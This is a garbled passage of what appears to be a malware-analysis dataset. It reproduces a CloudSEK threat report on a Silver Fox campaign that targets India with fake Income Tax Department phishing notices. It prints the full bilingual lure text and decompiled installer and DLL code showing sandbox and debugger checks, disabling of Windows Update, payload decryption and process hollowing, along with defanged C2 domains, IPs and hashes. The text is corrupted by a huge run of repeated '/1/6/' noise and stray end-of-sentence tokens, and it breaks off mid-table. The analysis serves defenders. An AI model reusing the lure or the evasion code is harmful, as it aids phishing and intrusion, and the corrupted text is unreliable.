low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "fwrite(Buffer_3,1u,Size,Stream);", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "free(Buffer_3);", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><